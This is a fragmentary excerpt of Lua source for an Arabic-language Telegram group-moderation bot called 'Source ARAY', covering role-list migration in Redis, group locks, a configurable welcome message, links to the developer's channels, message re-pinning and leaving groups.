for k,v in pairs(list2) do
DevRio:sadd(ARAY.."Rio:Constructor:"..Groups[i], v)
end
local list3 = DevRio:smembers(ARAY..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevRio:sadd(ARAY.."Rio:BasicConstructor:"..Groups[i], v)
end
local list4 = DevRio:smembers(ARAY..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevRio:sadd(ARAY.."Rio:Managers:"..Groups[i], v)
end
local list5 = DevRio:smembers(ARAY..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevRio:sadd(ARAY.."Rio:Admins:"..Groups[i], v)
end
local list6 = DevRio:smembers(ARAY..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevRio:sadd(ARAY.."Rio:VipMem:"..Groups[i], v)
end
DevRio:set(ARAY.."Rio:Lock:Bots"..Groups[i],"del") DevRio:hset(ARAY.."Rio:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
...
for i,Lock in pairs(LockList) do
DevRio:set(ARAY..Lock..Groups[i],true)
end
end
...
DevRio:del(ARAY..'Rio:Text:BotWelcome')
DevRio:del(ARAY..'Rio:Photo:BotWelcome')
return false
end 
...
DevRio:del(ARAY..'Rio:Lock:BotWelcome')
return false
end 
...
DevRio:set(ARAY..'Rio:Lock:BotWelcome',true)
return false
end 
...
DevRio:del(ARAY..'Rio:Text:BotWelcome')
DevRio:del(ARAY..'Rio:Photo:BotWelcome')
DevRio:set(ARAY.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevRio:get(ARAY.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء الامر", 1, "md") 
DevRio:del(ARAY.."Rio:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم حفظ النص ارسل لي صورة الترحيب\n↯︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevRio:set(ARAY.."Rio:Text:BotWelcome",text) 
DevRio:set(ARAY.."Rio:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevRio:get(ARAY.."Rio:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
...
DevRio:set(ARAY.."Rio:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
...
DevRio:setex(ARAY.."Rio:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
...
DevRio:del(ARAY.."DevText")
end end
--     Source ARAY     --
if DevRio:get(ARAY.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "↯︙تم الغاء الامر", 1, "md") 
DevRio:del(ARAY.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevRio:del(ARAY.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevRio:set(ARAY..'Rio:ChText',texxt)
...
DevRio:setex(ARAY.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
...
Text = [[
↯︙[قناة السورس](https://t.me/sxj3z)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ قناة السورس',url="t.me/sxj3z"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sxj3z&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
Text = [[
↯︙[مبرمج السورس](https://t.me/BH_U1)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ مبرمج السورس',url="t.me/BH_U1"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BH_U1&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source ARAY     --
...
DevRio:incr(ARAY..'Rio:EditMsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if DevRio:get(ARAY..'Rio:Lock:EditMsgs'..msg.chat_id_) and not Text and not RioConstructor(result) then
...
local GetMsgPin = DevRio:get(ARAY..'Rio:PinnedMsgs'..msg.chat_id_)
if GetMsgPin ~= nil then
if text == GetMsgPin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) if dp.ID == 'Ok' then;DevRio:del(ARAY..'Rio:PinnedMsgs'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if GetMsgPin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,dp) DevRio:del(ARAY..'Rio:PinnedMsgs'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
...
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
tdcli_function({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=ARAY,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
DevRio:srem(ARAY..'Rio:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
DevRio:srem(ARAY..'Rio:Groups',v)  
end
